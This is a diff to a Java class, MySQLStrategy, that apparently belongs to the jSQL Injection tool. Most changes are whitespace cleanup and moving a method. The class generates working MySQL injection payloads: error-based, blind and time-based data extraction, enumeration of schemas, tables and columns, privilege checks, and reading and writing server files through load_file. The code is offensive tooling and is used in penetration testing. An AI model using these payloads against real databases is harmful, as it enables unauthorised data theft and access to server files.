@@ -1,7 +1,6 @@
 package com.jsql.model.vendor;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 import com.jsql.model.bean.Database;
@@ -14,7 +13,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "concat(" +
                 "" +
                     "concat_ws(" +
@@ -32,7 +31,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -58,7 +57,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getTableList(Database database) {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -86,7 +85,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getColumnList(Table table) {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -122,7 +121,7 @@ public class MySQLStrategy extends ASQLStrategy {
         
         formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))";
         
-        return 
+        return
             "select+concat(" +
                 "group_concat(" +
                     "0x04," +
@@ -145,7 +144,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getPrivilege() {
-        return 
+        return
             /**
              * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
              * => forcage en charactère
@@ -168,19 +167,19 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String readTextFile(String filePath) {
-        return 
+        return
             /**
              * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
              * => forcage en charactère
              */
-             "cast(" +
-                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),0x01030307)" +
-             "as+char)";
+            "cast(" +
+                "concat(load_file(0x" + ToolsString.strhex(filePath) + "),0x01030307)" +
+            "as+char)";
     }
 
     @Override
     public String writeTextFile(String content, String filePath) {
-        return 
+        return
             MediatorModel.model().initialQuery
                 .replaceAll(
                     "1337" + MediatorModel.model().visibleIndex + "7331",
@@ -237,7 +236,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String blindStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "(" +
                 "select+" +
                 "concat(" +
@@ -252,8 +251,24 @@ public class MySQLStrategy extends ASQLStrategy {
     }
 
     @Override
+    public String timeStrategy(String sqlQuery, String startPosition) {
+        return
+            "(" +
+                "select+" +
+                    "concat(" +
+                        "0x53514c69," +
+                        "mid(" +
+                            "(" + sqlQuery + ")," +
+                            startPosition + "," +
+                            "65536" +
+                        ")" +
+                    ")" +
+            ")";
+    }
+
+    @Override
     public String getErrorBasedStrategyCheck() {
-        return 
+        return
             "+and(" +
                 "select+1+" +
                 "from(" +
@@ -269,7 +284,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String errorBasedStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "+and" +
                 "(" +
                 "select+" +
@@ -309,37 +324,21 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
-        "(" +
-            "select+" +
-                /**
-                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
-                 */
-                "concat(" +
-                    "0x53514c69," +
-                    "mid(" +
-                        "(" + sqlQuery + ")," +
-                        startPosition + "," +
-                        /**
-                         * Minus 'SQLi' should apply
-                         */
-                        MediatorModel.model().performanceLength +
-                    ")" +
-                ")" +
-        ")";
-    }
-
-    @Override
-    public String timeStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "(" +
                 "select+" +
+                    /**
+                     * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+                     */
                     "concat(" +
                         "0x53514c69," +
                         "mid(" +
                             "(" + sqlQuery + ")," +
                             startPosition + "," +
-                            "65536" +
+                            /**
+                             * Minus 'SQLi' should apply
+                             */
+                            MediatorModel.model().performanceLength +
                         ")" +
                     ")" +
             ")";
@@ -347,7 +346,7 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String performanceQuery(String[] indexes) {
-        return 
+        return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select+concat(0x53514c69,$1,repeat(0x23,65536),0x010303074c5153))"
@@ -375,6 +374,6 @@ public class MySQLStrategy extends ASQLStrategy {
 
     @Override
     public String getDbLabel() {
-        return null;
+        return "MySQL";
     }
 }
